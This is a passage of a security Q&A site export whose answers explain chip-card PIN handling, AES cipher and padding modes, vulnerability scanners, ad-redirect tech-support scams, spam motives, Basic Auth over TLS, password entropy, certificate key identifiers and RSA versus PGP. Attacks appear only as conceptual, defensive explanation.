<p>On the other hand, when a payment terminal uses the chip, the PIN code is sent to the chip only, and there is little need to talk to the bank at all. The whole transaction can be conducted offline. Of course, for big amounts, it is still a good idea to talk to the bank to know whether that much money exists on the buyer's account, but small transactions can be done efficiently with no network at all.</p>

<p>Thus, the magnetic stripe and the chip are used in two different ways, and having both does not mean that the security is lowered to the security of the weaker of the two. From the bank point of view, chips are better, because they are more efficient (no need to handle a network call) and harder to clone (statistics show a fraud rate divided by about 10). This is often translated into financial advantages granted to merchants who switch to chip-aware terminals.</p>

<hr />

<p>There can be variants in all of the above. For instance, <em>some</em> card include in the magnetic stripe an encrypted version of the PIN code -- but it won't be verified in the payment terminal. Instead, the terminal will have to talk to a regional bunkerized server who knows the decryption key and can do the verification. For some other card types, it is pretty clear that the magnetic stripe does not know anything about the PIN code, e.g. the chip-less American Express cards (from a few years ago) where you could change your PIN code by phoning your bank.</p>

<p>In any case, all the security features of a debit or credit card are not meant to protect <em>you</em>. They protect the <em>bank</em>. From the point of view of the bank, you are the enemy (regardless of what they claim in their ads).</p>
","55161"
"Can running a browser in Windows Compatibility Mode be a security issue?","19616","","<p>I have several clients that are having trouble logging into vendor's web service. When talking to the vendor about the issue, they told me to set them up with Chrome running in Windows XP compatibility mode. This is how they want the client to change the compatibility settings: </p>

<p><img src=""https://i.stack.imgur.com/TtQBU.png"" alt=""Look here!""> </p>

<p>I have some reservations about this <strike>fix</strike> workaround, given that Microsoft does not support Windows XP anymore (unless you pay for it). Can running a browser in Windows compatibility mode be a security issue?</p>
","<p>There are a few things that are enabled when setting compatibility mode, such as <a href=""https://superuser.com/a/663050/245640"">shimming</a>.</p>

<p>There are also other changes that may impact on security:-</p>

<blockquote>
  <p>There have also been some other changes from Windows version to Windows version. In older versions for example, if a programm [sic] loaded a DLL, the search path for the DLL also included the current directory. This is a security issue, so newer versions of Windows by default don't search in the current directory. With the proper shim you can simulate the old behaviour.</p>
</blockquote>

<p>This would normally only be a security issue for the local machine if an unprivileged user had permission to copy a malicious DLL to the Chrome installation folder it could be loaded in place of the normally loaded DLL and be executed when a privileged user next ran Chrome (although UAC would still mitigate the damage as this will still apply in compatibility mode).</p>

<p>The attacker would of course need access to the machine, and would need a perfect storm of misconfiguration to succeed. There are no vulnerabilities in the compatibility mode changes that I know of that would enable an attack on the client to succeed from the web where it would not normally succeed without compatibility mode.</p>
","58978"
"Which is the Best Cipher Mode and Padding Mode for AES Encryption?","19615","","<blockquote>
  <p><strong>As per PCI-DSS 3.4 requirement:</strong></p>
</blockquote>

<p>For storing Credit Card Data <strong>Strong Cryptography</strong> should be used.</p>

<p>I decided to use AES Encryption which is a strong and mostly recommended crypto for encrypting Credit Card Details.</p>

<p>I saw that AES has Cipher Mode and Padding Mode in it. </p>

<p>When I searched i found that according to <a href=""http://csrc.nist.gov/publications/nistpubs/800-38a/sp800-38a.pdf"">NIST Special Publication 800-38A</a>, it specifies five confidentiality modes of operation for symmetric key cipher algorithm.</p>

<p>So I'm totally confused whether can I use anyone of the five cipher modes or is there best one among the five as listed below:</p>

<blockquote>
  <p>Cipher Modes:</p>
</blockquote>

<ol>
<li>ECB  </li>
<li>CBC</li>
<li>OFB</li>
<li>CFB</li>
<li>CTR</li>
</ol>

<p><strong>Which is the best Cipher mode among the five?</strong></p>

<p><strong>Also which is the best Padding Mode for AES Ecryption?</strong></p>
","<p>""Best"" is rather subjective - it depends on your requirements. That said, I'll give you a general overview of each mode.</p>

<p><strong>ECB</strong> - Electronic Code Book. This mode is the simplest, and transforms each block separately. It just needs a key and some data, with no added extras. Unfortunately it sucks - for a start, identical plaintext blocks get encrypted into identical ciphertext blocks when encrypted with the same key. Wikipedia's <a href=""http://en.wikipedia.org/wiki/Cipher_block_chaining#Electronic_codebook_.28ECB.29"">article</a> has a great graphic representation of this failure.</p>

<p>Good points: Very simple, encryption and decryption can be run in parallel.</p>

<p>Bad points: Horribly insecure.</p>

<p><strong>CBC</strong> - Cipher Block Chianing. This mode is very common, and is considered to be reasonably secure. Each block of plaintext is xor'ed with the previous block of ciphertext before being transformed, ensuring that identical plaintext blocks don't result in identical ciphertext blocks when in sequence. For the first block of plaintext (which doesn't have a preceding block) we use an <em>initialisation vector</em> instead. This value should be unique per key, to ensure that identical messages don't result in identical ciphertexts. CBC is used in many of the SSL/TLS cipher suites.</p>

<p>Unfortunately, there are attacks against CBC when it is not implemented alongside a set of strong integrity and authenticity checks. One property it has is block-level malleability, which means that an attacker can alter the plaintext of the message in a meaningful way <em>without knowing the key</em>, if he can mess with the ciphertext. As such, implementations usually include a HMAC-based authenticity record. This is a tricky subject though, because even the order in which you perform the HMAC and encryption can lead to problems - look up ""MAC then encrypt"" for gory details on the subject.</p>

<p>Good points: Secure when used properly, parallel decryption.</p>

<p>Bad points: No parallel encryption, susceptible to malleability attacks when authenticity checks are bad / missing. But when done right, it's very good.</p>

<p><strong>OFB</strong> - Output Feedback. In this mode you essentially create a stream cipher. The IV (a unique, random value) is encrypted to form the first block of keystream, then that output is xor'ed with the plaintext to form the ciphertext. To get the next block of keystream the previous block of keystream is encrypted again, with the same key. This is repeated until enough keystream is generated for the entire length of the message. This is fine in theory, but in practice there are questions about its safety. Block transforms are designed to be secure when performed once, but there is no guarantee that <em>E(E(m,k),k)</em> is secure for every independently secure block cipher - there may be strange interactions between internal primitives that haven't been studied properly. If implemented in a way that provides partial block feedback (i.e. only part of the previous block is bought forward, with some static or weakly random value for the other half) then other problems emerge, such as a short key stream cycle. In general you should avoid OFB.</p>

<p>Good points: Keystream can be computed in advance, fast hardware implementations available</p>

<p>Bad points: Security model is questionable, some configurations lead to short keystream cycles</p>

<p><strong>CFB</strong> - Cipher Feedback. Another stream cipher mode, quite similar to CBC performed backwards. Its major advantage is that you only need the encryption transform, <em>not</em> the decryption transform, which saves space when writing code for small devices. It's a bit of an oddball and I don't see it mentioned frequently.</p>

<p>Good points: Small footprint, parallel decryption.</p>

<p>Bad points: Not commonly implemented or used.</p>

<p><strong>CTR</strong> - Counter Mode. This essentially involves encrypting a sequence of incrementing numbers prefixed with a nonce (<em>number used once</em>) to produce a keystream, and again is a stream cipher mode. This mode does away with the problems of repeatedly running transforms over each other, like we saw in OFB mode. It's generally considered a good mode.</p>

<p>Good points: Secure when done right, parallel encryption and decryption.</p>

<p>Bad points: Not many. Some question the security of the ""related plaintext"" model but it's generally considered to be safe.</p>

<hr>

<p>Padding modes can be tricky, but in general I would always suggest PKCS#7 padding, which involves adding bytes that each represent the length of the padding, e.g. <code>04 04 04 04</code> for four padding bytes, or <code>03 03 03</code> for three. The benefit over some other padding mechanisms is that it's easy to tell if the padding is corrupted - the longer the padding, the higher the chance of random data corruption, but it also increases the number of copies of the padding length you have. It's also trivial to validate and remove, with no real chance of broken padding somehow validating as correct.</p>

<hr>

<p>In general, stick with CBC or CTR, with PKCS#7 where necessary (you don't need padding on stream cipher modes) and use an authenticity check (HMAC-SHA256 for example) on the ciphertext. Both CBC and CTR come recommended by Niels Ferguson and Bruce Schneier, both of whom are respected cryptographers.</p>

<p>That being said, there are <em>new</em> modes! <a href=""http://en.wikipedia.org/wiki/EAX_mode"">EAX</a> and <a href=""http://en.wikipedia.org/wiki/Galois/Counter_Mode"">GCM</a> have recently been given a lot of attention. GCM was put into the TLS 1.2 suite and fixes a lot of problems that existed in CBC and stream ciphers. The primary benefit is that both are <em>authenticated modes</em>, in that they build the authenticity checks into the cipher mode itself, rather than having to apply one separately. This fixes some problems with padding oracle attacks and various other trickery. These modes aren't quite as simple to explain (let alone implement) but they are considered to be very strong.</p>
","52674"
"What benefits does Nessus have over OpenVAS?","19612","","<p>Nessus and OpenVAS appear to have fairly similar features. Why would you choose one over the other, besides the benefit of commercial support (which isn't available for Nessus Home Feed users anyways)?</p>
","<p>A recent test of Nessus and OpenVAS shows the benefits in using multiple scanners due to the difference in the signatures:<br>
<a href=""http://hackertarget.com/nessus-openvas-nexpose-vs-metasploitable/"" rel=""nofollow noreferrer"">Nessus, OpenVAS and Nexpose VS Metasploitable</a> (blog post by Peter at HackerTarget)</p>

<p>Out of 15 known security holes in the system used for the test, 4 were spotted by all four tested tools (Nessus, OpenVAS, Nexpose and some Nmap scripts); 7 were only spotted by some and 4 were missed completely.</p>

<p>Tenable responded with an article on <a href=""https://securityweekly.com/2012/08/24/the-right-way-to-configure-nes/"" rel=""nofollow noreferrer"">The Right Way To Configure Nessus For Comparison</a>.</p>
","19814"
"How did ""tech-supportcenter"" phishers trick Google?","19607","","<p>Related: <a href=""https://security.stackexchange.com/questions/41527/is-the-web-browser-status-bar-always-trustable"">Is the Web browser status bar always trustable?</a></p>

<p><a href=""https://security.stackexchange.com/questions/126400/how-can-google-search-change-the-location-in-a-url-tooltip"">How can Google search change the location in a URL tooltip?</a></p>

<p>I've always thought you can ""hover"" over a link to see where it really goes, until today.</p>

<p>A coworker (working from home) searched for ""Target"" in Google Search (using edge). He clicked the top result, which happened to be an ad, and was redirected to a phishing page posing as Microsoft trying to get him to call a ""tech support"" number.</p>

<p>I got the same results on a different computer, on a different network. When I hover over the link, both links show ""www.target.com"" at the bottom, but clicking the ad link takes you to a malware page and the second link (first search result after the ad) takes you to the real Target.com page.</p>

<p>If displaying the wrong URL in the tooltip requires Javascript, how did tech-supportcenter get their Javascript onto the Google search results page?</p>

<p><a href=""https://i.stack.imgur.com/ja1BJ.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/ja1BJ.png"" alt=""ad for &quot;target&quot; leading to malware site""></a>
<a href=""https://i.stack.imgur.com/Bd7PF.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/Bd7PF.png"" alt=""real search result for Target""></a>
<a href=""https://i.stack.imgur.com/PYNCS.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/PYNCS.png"" alt=""malware page""></a></p>

<p>UPDATE
Here's the same results in a virtual machine with a fresh install of Windows, on a different network:</p>

<p><a href=""https://i.stack.imgur.com/tbyPE.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/tbyPE.png"" alt=""same results in virtual machine on different network""></a></p>

<p>Here's the source for the URL. It looks like it does include the ""onmousedown"" Javascript as the first question I linked to mentioned. Does Google allow advertisers to display any URL they want for the tooltip?</p>

<p><a href=""https://i.stack.imgur.com/FUxsb.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/FUxsb.png"" alt=""page source for bad link""></a></p>

<h3>Update 06/06/2017</h3>

<p>So, it may be a coincidence, but</p>

<ul>
<li>The day after visiting this site, an unrecognized charge for ""GA Secretary of State"" for $350 appeared on my credit card. (Yes, I canceled the card). The malware domain is <a href=""https://virustotal.com/en/domain/tech-supportcenter.us/information/"" rel=""noreferrer"">registered to a guy in Georgia</a>.</li>
<li>I checked my version of Chrome and found that I was running version 58.0.3029.110 at the time I visited the site, which updated to 59.0.3071.86 today. It looks like version 59 was <a href=""https://chromereleases.googleblog.com/2017/06/stable-channel-update-for-desktop.html"" rel=""noreferrer"">released yesterday, with several security fixes</a>.</li>
<li>I ran a malware scan using Malwarebytes, which found ""PUP.Optional.GeekBuddy"" at HKLM\SYSTEM\CURRENTCONTROLSET\SERVICES\EVENLOG\APPLICATION\GEEKBUDDYRSP. This sounds like the kind of thing some fake ""tech support"" people would want to install. RSP for ""Remote Screen Protocol""?</li>
</ul>

<p>It's a tenuous connection, but now I'm worried I fell for a <a href=""https://security.stackexchange.com/questions/17852/is-there-a-real-possibility-of-getting-malware-by-drive-by"">drive-by exploit</a> by visiting the site. This doesn't really affect the question, but I wanted to bring this up because it sounds like several other people on this forum visited the site. You may want to run a scan as well.</p>

<p>The virtual machine where I visited the site in Internet Explorer doesn't seem to have been affected.</p>
","<blockquote>
  <p>If displaying the wrong URL in the tooltip requires Javascript, how did tech-supportcenter get their Javascript onto the Google search results page?</p>
</blockquote>

<p>The scammers did <strong>not</strong> manage to inject JS into the search results. That would be a cross-site scripting attack with much different security implications than misleading advertisement.</p>

<hr>

<p>Rather, the displayed target URL of a Google ad is not reliable and may conceal the actual destination as well as a chain of cross-domain redirects. The scammers possibly compromised a third-party advertiser and hijacked their redirects to lead you to the scam site.</p>

<p>Masking link targets is a deliberate feature of Google AdWords. It is generally possible to specify a custom <a href=""https://support.google.com/adwords/answer/2616010?hl=en"" rel=""noreferrer"">display URL</a> for an ad link which can be different from the effective <a href=""https://support.google.com/adwords/answer/6080568"" rel=""noreferrer"">final URL</a>. The idea is to enable redirects through trackers and proxy domains while keeping short and descriptive links. Hovering over an ad will only reveal the display URL in the status bar, not the real destination.</p>

<p>Here is an example:</p>

<ul>
<li>I'm searching for ""shoes"".</li>
<li>The first ad link displays <code>www.zappos.com/Shoes</code>:</li>
</ul>

<p><a href=""https://i.stack.imgur.com/YIHji.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/YIHji.png"" alt=""Zappos.com ad""></a></p>

<ul>
<li>When I click on it, I actually get redirected multiple times:

<pre>
https://<b>www.googleadservices.com</b>/pagead/aclk?sa=L&ai=DChXXXXXXXd-6bXXXXXXXXXXXXkZw&ohost=www.google.com&cid=CAASXXXXXp8Yf-eNaDOrQ&sig=AOD64_3yXXXXXXXXXXXXXYX_t_11UYIw&q=&ved=0aXXXXXXHd-6bUXXXXXXXXXwIJA&adurl=
-- 302 -->
http://<b>pixel.everesttech.net</b>/3374/c?ev_sid=3&ev_ln=shoes&ev_lx=kwd-12666661&ev_crx=79908336500&ev_mt=e&ev_n=g&ev_ltx=&ev_pl=&ev_pos=1t1&ev_dvc=c&ev_dvm=&ev_phy=1026481&ev_loc=&ev_cx=333037340&ev_ax=23140824620&url=http://www.zappos.com/shoes?utm_source=google%26utm_medium=sem_g%26utm_campaign=333037340%26utm_term=kwd-12666661%26utm_content=79908336500%26zap_placement=1t1&gclid=CI3vqXXXXXXXXXXXXXBBA
-- 302 -->
http://<b>www.zappos.com</b>/shoes?gclid=CI3vXXXXXXXXXXXXXMBBA&utm_source=google&utm_medium=sem_g&utm_campaign=333037340&utm_term=kwd-12666661&utm_content=79908336500&zap_placement=1t1
</pre></li>
</ul>

<p>Obviously, Google has strict <a href=""https://support.google.com/adwordspolicy/answer/6368661?hl=en"" rel=""noreferrer"">destination requirements</a> for ad links in place and an ordinary customer won't get their ad approved if they set the link target to a completely different domain. But scammers do occasionally find ways around the vetting process. 
At least, Google's policy about ""destination mismatches"" is pretty clear:</p>

<blockquote>
  <p>The following is not allowed:</p>
  
  <ul>
  <li><p>Ads that don't accurately reflect where the user is being directed
  [...]</p></li>
  <li><p>Redirects from the final URL that take the user to a different domain [...]</p></li>
  </ul>
</blockquote>

<p>Trusted third-party advertisers may be permitted to issue cross-domain redirects, though. Some of the exceptions are listed <a href=""https://support.google.com/adwordspolicy/answer/2643759?hl=en"" rel=""noreferrer"">here</a>, e.g.:</p>

<blockquote>
  <p>An example of an allowed redirect is a company, such as an AdWords
  Authorized Reseller, using proxy pages. [...]</p>
  
  <p>For example:</p>
  
  <ul>
  <li><strong>Original website:</strong> example.com</li>
  <li><strong>Proxy website:</strong> example.proxydomain.com</li>
  </ul>
  
  <p>We allow the company to use ""example.proxydomain.com"" as the final
  URL, but retain ""example.com"" as the display URL.</p>
</blockquote>

<p>One major weak spot is that Google doesn't control the third-party redirectors (in above example, that's <code>pixel.everesttech.net</code>). After Google has vetted and approved their ads, they could simply start redirecting to a different domain without immediately getting noticed by Google. It's possible that, in your case, attackers managed to compromise one of these third-party services and pointed their redirects to the scam site.</p>

<p>In recent months, there have been several press reports about an almost identical scam pattern, e.g. <a href=""http://www.zdnet.com/article/malicious-google-ad-pointed-millions-to-fake-windows-support-scam/"" rel=""noreferrer"">this report</a> about a fraudulent Amazon ad whose display URL spells out <code>amazon.com</code> but redirects to a similar tech support scam.</p>

<p>(By now, your discovery has also been picked up by a few news sites, <a href=""https://www.bleepingcomputer.com/news/security/ads-in-google-search-results-redirect-users-to-tech-support-scam/"" rel=""noreferrer"">including BleepingComputer</a>.)</p>
","161076"
"How and why do people spam my website form?","19503","","<p>In have a web form on my website, and someone keeps sending annoying spam through it. I know Captcha can block this, but why do people spam my site - what's their benefit?</p>

<p>How do they access my web form? Is there any script?</p>

<p>And how can I identify who I'm up against?</p>
","<p>They spam your (mine or everybody's) website because in the end it pays. Maybe because your visitors click on the URL, maybe because their own website gets a higher ranking on Google (because of many websites linking to theirs). It is not because it is <em>your</em> website, it is because they found a way to inject information easily (through a script or so).</p>

<p>Because their cost is extremely low (usually all systems they use are not owned by themselves, but compromised systems all around the world). They need only a handful of paying visitors in their own shop for maybe every 1000k+ spam messages they leave. Think about spam in global scale, not precisely your website. Yours just happens to be in their path.</p>

<p>For every more or less standard website (for example, based on <a href=""http://en.wikipedia.org/wiki/PhpBB"">phpBB</a>, <a href=""http://en.wikipedia.org/wiki/Joomla"">Joomla</a>, <a href=""http://en.wikipedia.org/wiki/Drupal"">Drupal</a>, <a href=""http://en.wikipedia.org/wiki/Scuttle_%28software%29"">Scuttle</a>, ...) if there are many installs on the Internet, it pays to develop a script to spam. Google will find the vulnerable sites for you. Browse through your webserver logs, and pay attention to referrers that mention Google. Study the query that got them to your website. You'll be surprised what search terms they've used to find your content.</p>

<p>The only reason why spam exists is because in the end it pays good money (at least for someone).</p>
","13225"
"What malicious things can happen when clicking on links in email?","19481","","<p>I've received a spam from one of my friends (well I'm sure he didn't send it). so there's this link, and i'd thought what exactly would be the implications of clicking the link (i've not clicked it yet)?</p>
","<p>The common reasons for links in spam email are:</p>

<ul>
<li><strong>verification that your email address is valid</strong> and that it is read which makes the email address more valuable for address brokers (the link needs to have some individual part, that can be a number, but it can also just be unique word from the dictionary). This kind of link may be labeld ""unsubscribe"".</li>
<li>the link may point to a <strong>phishing site</strong>, pretending to be from well-known-company such as eBay, but just wanting to trick you into entering your username and password for that side (e. g. <em>""your account needs to be verified""</em>). Please note two things: In HTML emails the displayed link text and the actual link target can be distinct. There are some special characters that look like normal ones</li>
<li>the link may point to a website which tries to <strong>exploit your browser</strong> or plugins to get access to your computer, or trick you to manually execute malicious code (e. g. <em>""get this video codec"", ""you computer is infected, get anti virus for free""</em>).</li>
<li>the spammer might want to get people to <strong>visit his or her website</strong> to advertise his products or opinions, manipulate polls, etc.</li>
</ul>

<p>Uncommon:</p>

<ul>
<li>the spammer may try to <strong>flood the target</strong> with lots of visitors. This is not effective as a distributed denial of service attack because the email is a lot larger than the data send by the browser to the target server. Reflective DDoS usually use DNS where a small query with a faked sender address can result in a much larger reply to the target site. But it may be effective to exploit some pay per click advertisement programs.</li>
</ul>

<p>More than one point may be true.</p>
","3675"
"Is HTTPS and Basic Authentication secure enough for banking webservices (RESTful)?","19472","","<p>I have been reading about SSL/TLS for the last few days and looks like it has never been practically cracked.</p>

<p>Given SSL/TLS is used for all communications between client application and the server, and given the password/API key is random and strong and securely stored on the server-side (bcryted, salted), do you think Basic Auth is secure enough, even for banking services?</p>

<p>I see a lot of people disliking the idea of username/password getting sent on the wire with every request. Is this a real weak point of Basic Auth (even with SSL/TLS used), or is it just out of irrational fear?</p>
","<p>HTTP Basic Authentication is not much used in browser-server connections because it involves, on the browser side, a browser-controlled login popup which is invariably ugly. This of course does not apply to server-server connections, where there is no human user to observe any ugliness, but it contributes to a general climate of mistrust and disuse for Basic Authentication.</p>

<p>Also, in the 1990s, before the days of SSL, sending plaintext passwords over the wire was considered a shooting offence, and, in their folly, people considered that challenge-response protocols like <a href=""http://en.wikipedia.org/wiki/Digest_access_authentication"">HTTP Digest</a> were sufficient to ensure security. We now know that it is not so; regardless of the authentication method, the complete traffic must be at least cryptographically linked to the authentication to avoid hijack by active attackers. So SSL is <em>required</em>. But when SSL is in force, sending the password ""as is"" in the SSL tunnel is fine. So, to sum up, Basic Authentication in SSL is strong enough for serious purposes, including nuclear launch codes, and even money-related matters.</p>

<p>One should still point out that security relies on the impossibility of <a href=""http://en.wikipedia.org/wiki/Man-in-the-middle_attack"">Man-in-the-Middle attacks</a> which, in the case of SSL (as is commonly used) relies on the server's certificate. The SSL client (another server in your case) MUST validate the SSL server's certificate with great care, including checking revocation status by downloading appropriate CRL. Otherwise, if the client is redirected to a fake server, the fake server owner will learn the password... In that sense, using something like HTTP Digest adds some extra layer of mitigation in case the situation got already quite rotten, because even with HTTP Digest, a fake server doing a MitM can still hijack the connection at any point.</p>

<hr />

<p>If we go a bit further, we may note that when using password-based authentication, we actually want password-based <em>mutual</em> authentication. Ideally, the SSL client and the SSL server should authenticate <em>each other</em> based on their knowledge of the shared password. Certificates are there an unneeded complication; theoretically, SSL client and server should use <a href=""http://tools.ietf.org/html/rfc4279"">TLS-PSK</a> or <a href=""http://tools.ietf.org/html/rfc5054"">TLS-SRP</a> in that situation, and avoid all the X.509 certificate business altogether.</p>

<p>In particular, in SRP, what the server stores is not the password itself but a derivative thereof (a hash with some extra mathematical structure). One shall note an important point: in the case of a Web API, both the client and the server are machines with no human involved. Therefore, the ""password"" does not need to be weak enough to be remembered by the meat bags. That password could be, say, a sequence of 25 random characters, with an entropy gone through the roof. This makes the usual password hashing methods (slow hashing, salts) kind of useless. We still want to avoid storing <em>in the server's database</em> (thus as a prey to potential SQL injections) the passwords ""as is"", but, <em>in that case</em>, a simple hash would be enough.</p>

<p>This points to the following: ideally, for a RESTful API to be used by one server to talk to another, with authentication based on a shared (fat) secret, the communication shall use TLS with SRP. No certificate, only hashes stored on the server. No need for HTTP Basic Auth or any other HTTP-based authentication, because all the work would have already occurred on the SSL/TLS level.</p>

<p>Unfortunately, the current state of deployment of SRP-able SSL/TLS implementations usually means that you cannot use SRP yet. Instead, you will have to use a more mundane SSL/TLS with an X.509 certificate on the server side, that the client dutifully validates. As long as the validation is done properly, there is no problem in sending the password ""as is"", e.g. as part of HTTP Basic Authentication.</p>
","44820"
"Confused about (password) entropy","19465","","<p>There seem to be many different 'kinds' of entropy. I've come across two different concepts:</p>

<p>A) The XKCD example of <code>correcthorsebatterystaple</code>. It has 44 bits of entropy because four words randomly chosen from a list of 2048 words is 4 * log2(2048) = 44 bits of entropy. This I understand.</p>

<p>B) The Shannon entropy of the actual string i.e. the entropy is calculated based on frequencies of the letters/symbols. Applying the Shannon formula on <code>correcthorsebatterystaple</code> the result is 3.36 bits of entropy per character.</p>



<pre><code># from http://stackoverflow.com/a/2979208
import math
def entropy(string):
        ""Calculates the Shannon entropy of a string""

        # get probability of chars in string
        prob = [ float(string.count(c)) / len(string) for c in dict.fromkeys(list(string)) ]

        # calculate the entropy
        entropy = - sum([ p * math.log(p) / math.log(2.0) for p in prob ])

        return entropy

print entropy('correcthorsebatterystaple')
# =&gt; 3.36385618977
</code></pre>

<p>Wikipedia only adds to my confusion:</p>

<blockquote>
  <p>It is important to realize the difference between the entropy of a set of possible outcomes, and the entropy of a particular outcome. A single toss of a fair coin has an entropy of one bit, but a particular result (e.g. ""heads"") has zero entropy, since it is entirely ""predictable"".<br>
  -- <a href=""https://en.wikipedia.org/wiki/Entropy_(information_theory)"">Wikipedia: Entropy (information theory)</a></p>
</blockquote>

<p>I don't quite understand the distinction between the entropy of the toss (generation) and the entropy of the result (the string).</p>

<ol>
<li>When is B used and for what purpose?</li>
<li>Which concept accurately reflects the entropy of the password?</li>
<li>Is there terminology to differentiate between the two?</li>
<li>True randomness could give us <code>correctcorrectcorrectcorrect</code>. Using
A we still have 44 bits. Using B the entropy would be the same as
that of <code>correct</code>. When is the difference between the two important?</li>
<li>If a requirement specifies that a string needs to have 20 bits of
entropy—do I use A or B to determine the entropy?</li>
</ol>
","<p>The Wikipedia article explains mathematical entropy, which isn't identical to what people mean when they talk about password entropy. Password entropy is more about how hard it is to guess a password under certain assumptions which is different from the mathematical concept of entropy.</p>

<p>A and B are not different concepts of password entropy, they're just using different assumptions as how a password is built.</p>

<p>A treats <code>correcthorsebatterystaple</code> as a string of English words and assumes that words are randomly selected from a collection of 2048 words. Based on these assumptions each word gives exactly 11 bits of entropy and 44 bits of entropy for <code>correcthorsebatterystaple</code>.</p>

<p>B treats <code>correcthorsebatterystaple</code> as a string of characters and assumes that the probability of any character to appear is the same as it is in the English language. Based on these assumptions <code>correcthorsebatterystaple</code> has 84 bits of entropy.</p>

<p>So which definition you use really depends on what assumptions you make about the password. If you assume the password is an XKCD-style password (and that each word indeed has a chance of one in 2048 to appear in the password) then A is the correct way to calculate entropy. If you don't assume the password is built as a collection of words but do assume that the probability of any character to appear to be equal to the probability of it's appearance in the English language then B is the correct way to calculate entropy.</p>

<p>In the real world none of these assumptions are correct. So if you have a ""requirement that specifies that a string needs to have 20 bits of entropy"" and this is for user generated passwords it's very difficult to give a precise definition of entropy. For more on this see <a href=""https://security.stackexchange.com/questions/21050/calculating-complex-password-entropy/"">Calculating password entropy?</a>.</p>

<p>If, on the other hand, you can use computer generated strings (and are using a good PRNG) then each alphanumeric character (a-z, A-Z, 0-9) will give almost 6 bits of entropy.</p>
","21147"
"What damage could be done if a malicious certificate had an identical ""Subject Key Identifier""?","19462","","<p>I'm looking at the the <a href=""http://certificateerror.blogspot.com/2011/02/how-to-validate-subject-key-identifier.html""><code>Subject Key Identifier</code> attribute of a CA certificate</a> and am trying to understand the role it plays in validation and infer how validating client software could get it wrong.</p>

<ul>
<li><p>What is the role of the Subject Key Identifier in validating a CA or End certificate?<br>
<em>Any knowledge of how it's implemented popular software packages would be helpful</em></p></li>
<li><p>What is the worst that an attacker could do if they could generate a public key that also contained the same hash?</p></li>
</ul>

<p>As I read <a href=""http://www.ietf.org/rfc/rfc3280.txt"">RFC3280</a> I see that the Subject Key Identifier (SKI) is like the glue that is used to build and verify the PKI chain.  The SKI also appears to be a more secure version than the certificate serial number and name that was also used to bind two certs together.</p>

<p>With regard to client validation of the certificate hash, do clients simply do a ""pattern match"" of the SKI, or is the chain SKI actually computed as described below:</p>

<blockquote>
  <p>For CA certificates, subject key identifiers SHOULD be derived from<br>
  the public key or a method that generates unique values.  Two common<br>
  methods for generating key identifiers from the public key are:</p>

<pre><code>  (1) The keyIdentifier is composed of the 160-bit SHA-1 hash of the
  value of the BIT STRING subjectPublicKey (excluding the tag,
  length, and number of unused bits).

  (2) The keyIdentifier is composed of a four bit type field with
  the value 0100 followed by the least significant 60 bits of the
  SHA-1 hash of the value of the BIT STRING subjectPublicKey
  (excluding the tag, length, and number of unused bit string bits).
</code></pre>
</blockquote>

<p>One example risk I'm trying to mitigate is a malformed CA certificate with a public key that doesn't hash to a correct SKI (done by manual ASN.1 editing and resigning the cert from the attacker's root)</p>
","<p>The <code>Subject Key Identifier</code> does <em>not</em> play a role in validation, at least not in the algorithm which makes up section 6 of <a href=""http://tools.ietf.org/html/rfc5280"">RFC 5280</a>. It is meant to be an help for <strong>path building</strong>, the activity which takes place before validation: this is when the entity who wants to validate a certificate assembles potential certificate chains that will then be processed through the section 6 algorithm. Section 4.2.1.2 describes this extension, and includes this text:</p>

<blockquote>
  <p>To facilitate certification path construction, this extension MUST
     appear in all conforming CA certificates, that is, all certificates
     including the basic constraints extension (Section 4.2.1.9) where the
     value of cA is TRUE.  In conforming CA certificates, the value of the
     subject key identifier MUST be the value placed in the key identifier
     field of the authority key identifier extension (Section 4.2.1.1) of
     certificates issued by the subject of this certificate.  Applications
     are not required to verify that key identifiers match when performing
     certification path validation.</p>
</blockquote>

<p>These ""MUST"" are obligations on the CA: to conform to the profile which RFC 5280 describes, CA must take care to match the <code>Authority Key Identifier</code> of the certificates it issues to its own <code>Subject Key Identifier</code>. Take note of the last sentence: this match is <em>not</em> part of what validation must verify.</p>

<p>It is recommended by the RFC to compute the key identifier through hashing, because it will minimize collisions, thus guarantee maximum efficiency of this extension for path building. However, hashing is not mandatory. CA can choose the identifier in any way as they see fit; and verifiers certainly do <em>not</em> recompute identifiers. This is pure byte-to-byte equality test. Also, I know as a fact that Microsoft's implementation of path validation is ready to build and try to validate paths where key identifiers do not match.</p>

<p>The worst that a rogue CA could do by reusing key identifiers is to make path building more difficult; this might trigger a kind of <a href=""http://en.wikipedia.org/wiki/Denial-of-service_attack"">denial of service</a> for verifiers who do path building through key identifiers and are too lazy to try otherwise. In practice, verifiers tend to build paths by matching the subject and issuer DN, not the key identifiers, so the practical impact should be close to nil.</p>
","27798"
"How does RSA encryption compare to PGP?","19426","","<p>On <a href=""https://stackoverflow.com/questions/892249/problem-generating-pgp-keys"">this</a> answer <a href=""https://stackoverflow.com/users/52201/ck"">ck</a> says </p>

<blockquote>
  <p>RSA and PGP are different.</p>
  
  <p>What you are essentially asking is how
  do I run my petrol car on diesel? The
  answer is you can't.</p>
</blockquote>

<p>I would be interested in a more detailed comparison between the two, why they are different, and why one would choose one over the other.</p>
","<p>RSA is an algorithm (actually, <em>two</em> algorithms: one for asymmetric encryption, and one for digital signatures -- with several variants). PGP is originally a piece of software, now a standard protocol, usually known as <a href=""http://tools.ietf.org/html/rfc4880"">OpenPGP</a>. OpenPGP defines formats for data elements which support secure messaging, with encryption and signatures, and various related operations such as key distribution. As a protocol, OpenPGP relies on a wide range of cryptographic algorithms, which it assembles together (which is not as easy as it seems, if you want the result to be secure). Among the algorithms that OpenPGP can use is RSA.</p>

<p>So, to keep with the car analogy, your question is like: ""What is the difference between a combustion engine and a Honda Accord ? Why would one choose one over the other ?"" The question makes no sense per se: the Accord comes with a combustion engine under its lid. It <em>also</em> comes with a bunch of other useful features, such as wheels; you cannot do much with a combustion engine alone.</p>

